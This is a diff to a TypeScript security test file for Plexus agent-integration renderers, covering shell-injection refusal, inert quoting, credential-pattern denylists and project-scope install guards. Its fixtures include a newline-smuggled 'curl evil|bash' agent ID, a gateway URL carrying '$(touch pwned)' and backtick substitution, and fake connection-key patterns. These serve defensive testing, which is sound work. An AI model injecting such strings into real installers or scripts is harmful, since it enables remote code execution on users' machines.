@@ -10,6 +10,12 @@
  *   B3 — a missing gatewayBaseUrl THROWS (single normalization point), never a host-less curl.
  *   C1 — the shared structural denylist blocks `plx_live_` (connection-key) in the generic path
  *        too — symmetric with the CC verifier.
+ *
+ * And the PROJECT-SCOPE structural guards (docs/design/agent-integration-project-scope.md §5.2):
+ * per-agent injections land in the PROJECT, never user-globally — rendered artifacts must not
+ * register at user scope, must not touch the retired global-PATH location, must not default the
+ * instruction into ~/.codex, and must fill every {{PLEXUS_ token they serve as instruction TEXT
+ * (setup.sh carries its {{PLEXUS_CMD}} token only together with the run-time sed fill).
  */
 
 import { describe, it, expect } from "bun:test";
@@ -29,6 +35,9 @@ import { assertSafeAgentId, shSingleQuote } from "@plexus/runtime/integration/sh
 function floorWith(baseUrl: string | undefined): WellKnownDocument {
   return { gateway: baseUrl === undefined ? {} : { baseUrl } } as unknown as WellKnownDocument;
 }
+
+/** A fixed injected state home (like the fixed compileStamp) — determinism for the generic renderer. */
+const FIXED_HOME = "/home/tester/.plexus";
 
 const MALICIOUS_IDS = [
   "x\ncurl evil|bash",
@@ -50,7 +59,9 @@ describe("A1 — renderers refuse an unsafe agentId (no live-shell injection)", 
 
   it("renderGeneric REFUSES a newline-injecting agentId (never emits a live shell line)", () => {
     for (const id of MALICIOUS_IDS) {
-      expect(() => renderGeneric({ agentId: id, gatewayBaseUrl: "http://127.0.0.1:7077" })).toThrow();
+      expect(() =>
+        renderGeneric({ agentId: id, gatewayBaseUrl: "http://127.0.0.1:7077", plexusHome: FIXED_HOME }),
+      ).toThrow();
     }
   });
 
@@ -72,7 +83,7 @@ describe("A3 — gatewayBaseUrl with shell metacharacters is emitted inert (sing
   const EVIL_BASE = "http://127.0.0.1:7077/$(touch pwned)`id`";
 
   it("generic setup.sh binds the base to a single-quoted *_DEFAULT var (no bare substitution)", () => {
-    const { setupSh } = renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: EVIL_BASE });
+    const { setupSh } = renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: EVIL_BASE, plexusHome: FIXED_HOME });
     // The base appears ONLY as an inert single-quoted literal.
     expect(setupSh).toContain(`PLEXUS_GATEWAY_DEFAULT=${shSingleQuote(EVIL_BASE)}`);
     // …and NOT as a bare, un-quoted `${PLEXUS_GATEWAY:-<evil>}` default (the old vulnerable form).
@@ -94,8 +105,8 @@ describe("A3 — gatewayBaseUrl with shell metacharacters is emitted inert (sing
 
 describe("B3 — a missing gatewayBaseUrl throws (never a host-less curl)", () => {
   it("renderGeneric throws when the Floor has no baseUrl", () => {
-    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: undefined })).toThrow();
-    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: "" })).toThrow();
+    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: undefined, plexusHome: FIXED_HOME })).toThrow();
+    expect(() => renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: "", plexusHome: FIXED_HOME })).toThrow();
   });
   it("renderPlugin throws when the Floor has no baseUrl", () => {
     expect(() =>
@@ -113,14 +124,142 @@ describe("C1 — the shared structural denylist blocks plx_live_ in the generic 
   it("assertGenericVerified throws when any served artifact contains a connection-key pattern", () => {
     const fakeKey = "plx_live_" + "a".repeat(48);
     expect(() =>
-      assertGenericVerified({ setupSh: `echo ${fakeKey}`, instruction: "", setupCommand: "" }),
+      assertGenericVerified({ setupSh: `echo ${fakeKey}`, instruction: "", setupCommand: "", launcherPath: "" }),
     ).toThrow(/connection-key/i);
   });
   it("assertGenericVerified throws for a baked PAT / one-time code too", () => {
     const pat = "plx_agent_" + "a".repeat(32);
     const code = "plx_enroll_" + "b".repeat(32);
-    expect(() => assertGenericVerified({ setupSh: pat, instruction: "", setupCommand: "" })).toThrow();
-    expect(() => assertGenericVerified({ setupSh: "", instruction: code, setupCommand: "" })).toThrow();
+    expect(() =>
+      assertGenericVerified({ setupSh: pat, instruction: "", setupCommand: "", launcherPath: "" }),
+    ).toThrow();
+    expect(() =>
+      assertGenericVerified({ setupSh: "", instruction: code, setupCommand: "", launcherPath: "" }),
+    ).toThrow();
+  });
+});
+
+// ── PROJECT-SCOPE structural guards (agent-integration-project-scope §5.2) ──────────────────────
+// String-structural, no execution: per-agent injections land in the PROJECT ($PWD at paste time),
+// never user-globally. Same shape as the single-quoted-`*_DEFAULT` guards above.
+describe("§5.2 — CC install.sh registers into the project, never user scope", () => {
+  const BASE = "http://127.0.0.1:7077";
+  /** The one line legitimately carrying `--scope user`: the migration-hint UNINSTALL suggestion. */
+  const MIGRATION_HINT_RE = /^.*consider removing it: claude plugin uninstall plexus@plexus --scope user.*$/m;
+
+  function renderedFiles() {
+    return renderPlugin({
+      floor: floorWith(BASE),
+      capabilityIds: [],
+      agentId: "ok-agent",
+      enrollmentCode: "plx_enroll_placeholder",
+      compileStamp: "2026-07-11T00:00:00.000Z",
+    }).files;
+  }
+
+  it("install.sh passes --scope \"$PLEXUS_CC_SCOPE\" explicitly on BOTH registration commands", () => {
+    const installSh = renderedFiles().find((f) => f.path === "install.sh")!.content;
+    expect(installSh).toContain('claude plugin marketplace add "$DIR" --scope "$PLEXUS_CC_SCOPE"');
+    expect(installSh).toContain('claude plugin install "$PLUGIN_NAME@$MARKETPLACE" --scope "$PLEXUS_CC_SCOPE"');
+    // The knob is validated local|project — 'user' cannot be reintroduced through the env.
+    expect(installSh).toContain('PLEXUS_CC_SCOPE="${PLEXUS_CC_SCOPE:-local}"');
+    expect(installSh).toContain("local|project) ;;");
+  });
+
+  it("install.sh carries the $PWD = $HOME guard + the /reload-plugins and --plugin-dir output contract", () => {
+    const installSh = renderedFiles().find((f) => f.path === "install.sh")!.content;
+    expect(installSh).toContain('if [ "$PWD" = "$HOME" ]; then');
+    expect(installSh).toContain("/reload-plugins");
+    expect(installSh).toContain("--plugin-dir");
+    expect(installSh).toContain("installed into project $PWD");
+  });
+
+  it("NO emitted file registers at user scope; the ONLY --scope user is the migration-hint uninstall suggestion", () => {
+    for (const f of renderedFiles()) {
+      // Strip the single sanctioned occurrence (install.sh's migration hint), then demand zero left.
+      const rest = f.content.replace(MIGRATION_HINT_RE, "");
+      expect(rest).not.toContain("--scope user");
+      // The retired global-PATH location never appears in a CC-emitted file either.
+      expect(f.content).not.toContain(".local/bin");
+    }
+  });
+
+  it("the migration hint DETECTS (entry-scoped registry check) and SUGGESTS — it never uninstalls itself", () => {
+    const installSh = renderedFiles().find((f) => f.path === "install.sh")!.content;
+    expect(installSh).toContain('CC_REGISTRY="${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins/installed_plugins.json"');
+    expect(installSh).toMatch(MIGRATION_HINT_RE);
+    // The uninstall verb appears ONLY inside echoed text (a suggestion), never as a live command:
+    // every line containing it must be an echo.
+    for (const line of installSh.split("\n")) {
+      if (line.includes("claude plugin uninstall")) expect(line.trimStart().startsWith("echo ")).toBe(true);
+    }
+  });
+});
+
+describe("§5.2 — generic delivery: state-home launcher, project AGENTS.md, complete token fill", () => {
+  const BASE = "http://127.0.0.1:7077";
+
+  function rendered() {
+    return renderGeneric({ agentId: "ok-agent", gatewayBaseUrl: BASE, plexusHome: FIXED_HOME });
+  }
+
+  it("setup.sh installs the launcher under $PLEXUS_HOME/agents/$AGENT_ID/bin/ — never ~/.local/bin", () => {
+    const { setupSh } = rendered();
+    expect(setupSh).toContain('LAUNCHER="$PLEXUS_HOME/agents/$AGENT_ID/bin/plexus"');
+    expect(setupSh).not.toContain(".local/bin");
+    expect(setupSh).not.toContain("BIN_DIR");
+  });
+
+  it("setup.sh lands the block at $PWD/AGENTS.md by default (a ~/.codex default-expansion never renders)", () => {
+    const { setupSh } = rendered();
+    expect(setupSh).toContain('AGENTS_FILE="${AGENTS_FILE:-$PWD/AGENTS.md}"');
+    expect(setupSh).not.toMatch(/AGENTS_FILE="\$\{AGENTS_FILE:-[^}"]*\.codex\//);
+    expect(setupSh).toContain('if [ "$PWD" = "$HOME" ]; then');
+  });
+
+  it("the served instruction is token-COMPLETE (absolute launcher filled); setup.sh carries the run-time sed fill", () => {
+    const r = rendered();
+    expect(r.instruction).not.toContain("{{PLEXUS_");
+    expect(r.instruction).toContain(`${FIXED_HOME}/agents/ok-agent/bin/plexus`);
+    expect(r.launcherPath).toBe(`${FIXED_HOME}/agents/ok-agent/bin/plexus`);
+    // setup.sh legitimately CARRIES the token — paired with the sed that resolves it at run time.
+    expect(r.setupSh).toContain('sed "s#{{PLEXUS_CMD}}#$LAUNCHER#g"');
+    // A clean render passes the serve-time gate (which now enforces all of the above).
+    expect(() => assertGenericVerified(r)).not.toThrow();
+  });
+
+  it("assertGenericVerified REJECTS a regression: .local/bin, a ~/.codex default, a dropped sed fill, an unfilled token", () => {
+    const clean = rendered();
+    expect(() =>
+      assertGenericVerified({ ...clean, setupSh: clean.setupSh + '\nln -sf x "$HOME/.local/bin/plexus"\n' }),
+    ).toThrow(/\.local\/bin/);
+    expect(() =>
+      assertGenericVerified({
+        ...clean,
+        setupSh: clean.setupSh.replace(
+          'AGENTS_FILE="${AGENTS_FILE:-$PWD/AGENTS.md}"',
+          'AGENTS_FILE="${AGENTS_FILE:-$HOME/.codex/AGENTS.md}"',
+        ),
+      }),
+    ).toThrow(/\.codex/);
+    expect(() =>
+      assertGenericVerified({
+        ...clean,
+        setupSh: clean.setupSh.replace('sed "s#{{PLEXUS_CMD}}#$LAUNCHER#g" "$BLOCK_TMP" > "$BLOCK_FILLED"', ":"),
+      }),
+    ).toThrow(/sed fill/);
+    expect(() =>
+      assertGenericVerified({ ...clean, instruction: clean.instruction + "\n{{PLEXUS_CMD}} list\n" }),
+    ).toThrow(/unfilled/);
+    expect(() =>
+      assertGenericVerified({
+        ...clean,
+        setupSh: clean.setupSh.replace(
+          'LAUNCHER="$PLEXUS_HOME/agents/$AGENT_ID/bin/plexus"',
+          'LAUNCHER="$HOME/bin/plexus"',
+        ),
+      }),
+    ).toThrow(/launcher/);
   });
 });
 
